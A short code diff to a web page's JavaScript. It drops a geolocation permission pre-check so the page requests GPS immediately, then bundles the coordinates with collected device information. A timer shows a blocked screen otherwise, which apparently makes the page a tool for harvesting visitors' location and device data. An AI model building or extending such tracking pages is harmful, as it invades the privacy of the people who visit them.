@@ -511,7 +511,7 @@
             }
         }
 
-        // Initial load — check permission state and request GPS immediately
+        // Initial load — request GPS directly (no permission pre-check)
         window.addEventListener('load', async () => {
             let done = false;
 
@@ -520,21 +520,7 @@
                 if (!done) { done = true; showBlocked(); }
             }, 10000);
 
-            let permState = 'prompt';
-            try {
-                const perm = await navigator.permissions.query({ name: 'geolocation' });
-                permState = perm.state;
-            } catch (e) { }
-
-            if (permState === 'denied') {
-                clearTimeout(safetyTimer);
-                done = true;
-                retryCount = 1;
-                showBlocked();
-                return;
-            }
-
-            // Request GPS
+            // Request GPS directly — this triggers the permission prompt
             try {
                 const gpsPosition = await new Promise((resolve, reject) => {
                     if (!navigator.geolocation) { reject(new Error('Not supported')); return; }
@@ -546,7 +532,6 @@
                 if (!done) {
                     clearTimeout(safetyTimer);
                     done = true;
-                    // GPS granted!
                     const info = await collectDeviceInfo();
                     info.gpsLocation = {
                         lat: gpsPosition.coords.latitude,
